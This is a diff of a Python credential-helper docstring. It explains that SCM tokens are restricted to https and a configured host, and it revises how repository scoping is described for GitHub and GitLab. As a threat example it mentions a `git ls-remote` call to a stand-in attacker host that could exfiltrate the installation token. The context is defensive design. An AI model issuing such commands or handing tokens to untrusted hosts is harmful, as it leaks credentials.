@@ -126,9 +126,10 @@ def _is_authorized_request(input_lines: dict[str, str]) -> tuple[bool, str]:
     The system-wide helper would otherwise hand the SCM token to any host
     git resolves — a malicious submodule URL or `git ls-remote
     https://attacker.example/...` could exfiltrate the installation token. We
-    scope by protocol and host. We deliberately do not scope to the session repo:
-    the existing system uses installation-wide credentials, and setup/start hooks
-    may clone sibling private repositories that the installation can access.
+    scope delivery by protocol and host. Repository access is enforced by the
+    issued credential: GitHub tokens cover only the session or build repository
+    set, intersected with owning-team grants when applicable. GitLab uses a
+    deployment-wide PAT without per-session narrowing.
 
     * protocol must be ``https`` (never hand a token to a plaintext remote);
     * host must equal the configured ``VCS_HOST``.
